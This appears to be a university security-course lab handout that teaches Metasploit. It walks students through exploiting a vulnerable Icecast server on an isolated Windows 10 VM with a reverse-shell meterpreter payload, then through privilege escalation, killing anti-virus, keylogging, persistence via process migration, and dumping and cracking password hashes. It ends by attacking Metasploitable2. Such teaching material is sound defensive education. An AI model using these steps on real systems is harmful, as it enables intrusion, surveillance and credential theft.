---

title: Lab &ndash; Exploitation
number: 7
vms:
    - Kali
    - Windows 10
    - Metasploitable2
---

In this lab you will use Metasploit and the Nessus vulnerability report from the previous lab to exploit and take control of a Windows 10 VM and the Metasploitable VM you scanned in the previous lab.



# Metasploit 

Metasploit is the industry’s most popular exploitation tool. According to Sectools.org:

> Metasploit took the security world by storm when it was released in 2004. It is an advanced open-source platform for developing, testing, and using exploit code. The extensible model through which payloads, encoders, no-op generators, and exploits can be integrated has made it possible to use the Metasploit Framework as an outlet for cutting-edge exploitation research. It ships with hundreds of exploits, as you can see in their list of modules. This makes writing your own exploits easier, and it certainly beats scouring the darkest corners of the Internet for illicit shellcode of dubious quality.

> Metasploit was completely free, but the project was acquired by Rapid7 in 2009 and it soon sprouted commercial variants. The Framework itself is still free and open source, but they now also offer a free-but-limited Community edition, a more advanced Express edition ($3,000 per year per user), and a full-featured Pro edition ($15,000 per user per year). Other paid exploitation tools to consider are Core Impact (more expensive) and Canvas (less).


    
## Metasploit Interfaces

The Metasploit framework has a variety of different interfaces, including the command line tool `mcli` and `meterpreter`, an interface designed to interact with compromised computers. You can even work from an interactive Ruby programming language interpreter within Metasploit (Metasploit is written in Ruby). However, the most popular interface, and the one we will use chiefly in this lab, is `msfconsole`. Msfconsole is an interactive environment that allows you to scan hosts, test and launch exploits, and build and deploy payloads.



## Terminology

Below is a list of common terminology relating to Metasploit, taken (with some adaptation) from Metasploit: The Penetration Tester’s Guide, by Kennedy et al.

Exploit	
: The means by which an attacker takes advantage of a flaw within a 	system, an application or service. An exploit results in a particular 	outcome unintended by the original developer. Common exploits 	include buffer overflows, web application vulnerabilities (like SQL 	injection), and configuration errors. 

Payload	
: Code that the attacker wants the system to execute and that is selected and delivered by Metasploit. For example, a reverse shell is a payload that creates a connection from the target machine back to the attacker as a command prompt, whereas a bind shell is a payload that “binds” a command prompt to a listening port on the target machine, to which the attacker can then connect. A payload could also be 	something as simple as a few commands to be executed on the target operating system.

Module	
: A module in the context of Metasploit is a piece of software that can be 	used by Metasploit. At times, you may require the use of an exploit 	module, a software component that conducts the attack. Other times, 	an auxiliary module may be required to perform an action such as 	scanning or system enumeration. These interchangeable modules are 	the core of what makes Metasploit so powerful.

Listener	
: A component within Metasploit that waits for an incoming connection of 	some kind. For example, after the target machine has been exploited, 	it may call the attacking machine over the Internet. The listener 	handles that connection, waiting on the attacking machine to be 	contacted by the exploited system.




## Common Commands within Msfconsole


|-|-|
| help | Lists available commands. |
| show exploits | Shows all available exploits in the Metasploit framework. New exploits  are constantly being developed and incorporated into the framework. |
| show auxiliary | Shows auxiliary modules within Metasploit framework. |
| search | Searches exploit and auxiliary modules for one or more terms. For  those familiar with grep, the search function works the same way. |
| use [module] | Loads a Metasploit module. The back command exits the module. |
| back | Exits the current module. |
| show options | Within a particular module, show options displays the required and  optional configurations that the module uses. |
| show payloads | Within a module, show payloads displays all the payloads that are  available to use with the module. |
| show targets | Within a module, list targets shows OS versions that are vulnerable to  the module. |
| Info | Within a module, info shows additional information about the module. |
| set/unset | Sets an environment variable used as an option specific to a  particular module. |
| setg/unsetg | Sets a global environment variable used as an option that applies  across modules. |
| save | Saves the current global options so they are available the next time you run msfconsole. |





# Get the Windows 10 VM ready

Use the Windows 10 vm for this.

6.	Open Windows Defender and turn off real-time protection. To do this:
    
    * Using my script, 
        * Double-click the `disable-defender.ps1` script which is on the Desktop.
    * Or, manually, 
        * click the windows button on the bottom left of the desktop and searching for 'Defender' and choose 'Windows Defender Security Center'
        * click 'Virus & Threat protection settings'
        * move the 'Real-time protection' slider to the left.

7.	Turn off Windows Firewall. Open CMD with administrative privileges by typing in “cmd” in the Windows search field. Right-click the “Command Prompt” icon, and select “Run as administrator.” Once the command prompt opens, enter the following command:

        netsh advfirewall set allprofiles state off
        
        
# Configure Kali Linux VM

2.	Boot your Kali VM, and login as user root and password toor.
3.	open a terminal and try to ping the IP address of the Windows 10 VM.
4.	Finally, from the Windows 10 VM, ensure that you can ping the Kali VM. 
    If you are successful in pinging the VM in both directions, then you are ready to continue the lab. If not, make sure that each VM is connected to the `infosec-net` network by checking `ifconfig`, and also make sure that the firewall is down on Windows 10.


# Start Icecast on Windows 10

Icecast is a media streaming sever that was vulnerable to a buffer overflow attack in versions 2.01 and earlier 
[see the exploit information here](https://www.rapid7.com/db/modules/exploit/windows/http/icecast_header). Old versions of Icecast can be found [here](https://ftp.osuosl.org/pub/xiph/releases/icecast/). For this section of the lab, you will run a vulnerable version of the Icecast server.

1.	On Windows 10 desktop, right-click the “Icecast2 Win32” icon. Select “run as administrator,” and click “yes” on the warning message the pops up.
2.	In the Icecast window, click the button “Start server.” 



# Metasploit Exploit Walkthrough using the Icecast Vulnerability

1.	Boot your Kali VM, and login.
2.	From the terminal, enter:

        service postgresql start

3.	From the terminal, enter:

        msfconsole

    You should see a “msf >” prompt appear. This is the Metasploit command line.
    
4.	From the `msf >` prompt, try:
        
        search icecast
    
    If the output tells you that you are using "slow search", then cancel with `ctrl+c`, and run the following from the `msf >` prompt:

        msfdb init
        db_connect
        db_rebuild_cache

    This will allow you to search for Metasploit exploit and auxiliary modules. It may take some time before the search cache is ready. You can still use "slow search" meanwhile.
    
5. In the search output, you should see an exploit related to `icecast` called `exploit/windows/http/icecast_header`. Use it:
          
        use exploit/windows/http/icecast_header
        
    **Note:** you can press the tab key within Metasploit to complete a module or command name you are typing. This makes entering commands in Metasploit faster. If you push the tab key twice it will show you all possible options directory you are in.

6.	Your msfconsole prompt should now look like this:

        msf  exploit(icecast_header) >
        
    Indicating that the `icecast_header` module is loaded.
        
7.	To get more information about this exploit module, type `info`. This module has been rated “great,” meaning it is very effective and reliable. 
    Besides providing a better description, the `info` command shows the targets that the module is effective against, as well as options to set.

8.	To show available options, type `show options`.

9.	Let’s set the required options. First, we’ll set the remote host: 

        set rhost [IP address of your Windows 10 VM]
        
    Type `show options` again to see that the RHOST variable has been set.

10.	Next, let’s look at available payloads for this exploit: 

        show payloads

11.	We have a lot of payload options for this module. We’ll use one of the most popular and reliable payloads. Type:
 
        set payload windows/meterpreter/reverse_tcp

    This payload will open a reverse TCP connection from the exploited Windows 10 VM back to the Kali VM. This is why it is important that you are able to reach Kali from Windows 10, and Windows 10 from Kali.
    
12.	Type `show options` again to see the options that are required for this payload.

13.	To set the local host variable, type 

        set lhost [IP address of the Kali machine]
        
    **Note:** you can easily check your IP in Unix/Linux by typing ifconfig from within Metasploit. Type `show options` to see that the variable has been set.

14.	With all options set, now it’s time to <span class='label label-danger'><i class='fa fa-rocket'></i> launch the exploit!</span>. Type: 

        exploit
        
    (Or equivalently, `run`, but that's less fun.)

15.	You should now be presented with the “meterpreter >” prompt. If you see this, then <i class='fa fa-birthday-cake'></i> congratulations! You’ve exploited your first remote host. 

16. Laugh maniacally.

    {% include lab_question.html question='How did it feel to laugh maniacally?' %}
    

16.	Now that we have access, let’s run a few commands to give you an idea of the power of the meterpreter interface. Type `sysinfo` to see information about the compromised system.

17.	Type `getuid` to see the system user you now control.

18.	Escalate your privileges by typing `getsystem`. Type `getuid` again. You should see that you have “NT AUTHORITY\SYSTEM,” which means you administrator privileges. Laugh again.

19.	Type `run killav` to stop anti-virus processes that might limit our attacks on the machine.

20.	You can execute commands on the victims host from within Meterpreter. For example, type:

        execute -f cmd.exe -c 

    This will launch cmd.exe on the victim’s machine. You can hide the command window from being shown on the victim machine by using the `-h` option.

    The `-c` option “channelizes” the cmd.exe, which means that meterpreter can continue interacting with it. Notice the message that “Channel 1 was created.”

    Interact with cmd.exe by typing: `channel -i 1`. Use the `dir`, `cd`, and `cd ..` commands to browse around the file system. Type `exit` to return to meterpreter.
    
21.	Since opening a command prompt is such a common action, you can simply type `shell` to open a hidden command prompt. 

22. From a windows `cmd`, run the following commands:
    
        echo %date%
        echo "[your name and your email]
        
    And capture a screenshot showing the output, along with the `C:\Program Files/Icecast2 Win32>` prompt.
    
    {% include lab_question.html question='Submit a screenshot proving that you pwnd the windows box' %}
    
    Type `exit` to return to meterpreter.

22.	Type `screenshot` to capture a screenshot of the current GUI. A jpeg file should be saved to `/root` on your Kali machine. You can view the image (outside of meterpreter) by typing `cd; eog [image name]`.

23.	View the Windows GUI. 

    <div class='alert alert-info'>This is buggy and doesn't work very often. Don't worry if it doesn't.</div>
    
    Type `run vnc`. Wait a minute for the TightVNC client to open. Use TightVNC to view the Windows GUI

24.	Type `keyscan_start`. From the Windows 10 machine, open Notepad.exe and type some words. Back in meterpreter, type `keyscan_dump`. You should see the text you typed in Notepad. To stop the keylogger, type `keyscan_stop`.

25.	Download a file. Type `ls` to see a listing of files in the current directory. Use Notepad to create a text document on the Desktop of the Windows 10 machine. Use the `cd` command within Meterpreter to browse to the desktop. Type `download [filename]` to download the text document you just created to the Kali VM. The file should be saved to the Kali VM at /root.

26.	Annoy the user. Background the meterpreter session by typing, `background`. Then type:

        use post/multi/manage/play_youtube

    Type `show options`. Get the session number for your meterpreter session by typing, `sessions -l` (that’s a lowercase “L”). Note the ID number of your meterpreter session. Type, `set session [ID]`, where [ID] is the session number you just identified. 
    
    From your laptop or whatever, select your favorite annoying youtube video. Note the url of the video -- it will include a `v=[video id]` in it. Copy the video id. For example,
    one video id is `DLzxrzFCyOs`. If you chose this video, you would type:
    
        set vid DLzxrzFCyOs
        
    Then,
        
        run

    On Windows, enjoy your annoying video. You can close the launched window by typing, `control + w`.

    To interact with your meterpreter session again, type `sessions -i [ID]` where “ID” is the number of your meterpreter session identified above.
    
    {% include lab_question.html question='Share on slack which annoying video you chose. (remind me to create a slack channel for this if I have not by the time you
    do this lab.)' %}

27.	You can migrate meterpreter from the current exploited process to another, more permanent process that is at less risk of being closed down. In this example, you can migrate from the exploited Icecast process to a more permanent process so that you are not at risk of losing your access to the system if Icecast is terminated.

    Type `ps -S Icecast` (note the capital ‘S’ argument and the captial 'I' in Icecast) to search for processes with the name of “Icecast.” Note the process ID. Next, type `getpid` to get the process that meterpreter is running off of. It should be the same process ID as Icecast.

    Type `ps` to see a list of running processes. Type `ps -S winlogon` to find the process ID for “winlogon.exe,” which is part of the Windows login system. Note that it also has “System” authority. Type `migrate [PID for winlogon.exe]`. Type `getpid` again to verify that you are now running off of the Winlogon process. Now your connection to the Windows 10 VM will persist until it is rebooted or powered off.

    Finally, on your Windows VM, close the Icecast window. Your meterpreter session should still be running.
    
28.	Now that you are running off of a system process, you can now obtain the password hashes for the machine by typing `hashdump`. 
	These hashes can be readily cracked using a password cracker like Hashcat or John the Ripper (covered in the password cracking lab). 
	For now, we’ll use Google to crack the password hash for user `labuser`.

    **Note:** hashdump command outputs hashes in the following format:

        username:SID:LANMAN hash:<NTLM hash>:::

    For example, in the following hashdump, the NTLM hash is `C1F1B7BDB01896908C80A0A67062BF24`:

        Frank:1000:3A956F63F23DAC7236077A718CCDF409:C1F1B7BDB01896908C80A0A67062BF24:::

    Copy the NTLM hash that you obtain from `hashdump`, open the web browser, visit, a site like [https://crackstation.net](https://crackstation.net), and let it crank on your hash.
    This site uses a rainbow table.
    
    Alternatively, try to crack it on your own using `hashcat` with `-m 1000` (NTLM) and a wordlist like rockyou. Go on, it's fun!

29.	To see other Meterpreter commands, type `help`.

30.	When you’re finished, type `exit` to close the Meterpreter session.


# Metasploitable2 Discovery

<div class='alert alert-danger'><strong>Take Note!</strong> This section attacks Metasploitable2, <em>not</em> the Windows machine!</div>

Now, attack Metasploitable2 using Metasploit from Kali. Use your Nessus report to identify promising exploits and compromise or get information from Metasploitable 2 using at least three different exploit or auxiliary modules. Do your best.
 
If you get stuck, feel free to look up a walkthrough for help (many exist). For example, you could use [this page](http://blog.securelayer7.net/attacking-metasploitable-2-using-metasploit/).



## Metasploitable2 Attack Deliverables
	
{% include lab_question.html question='For this lab deliverable, you will submit screenshot evidence of three different successful exploits you launched against Metasploitable 2' %}




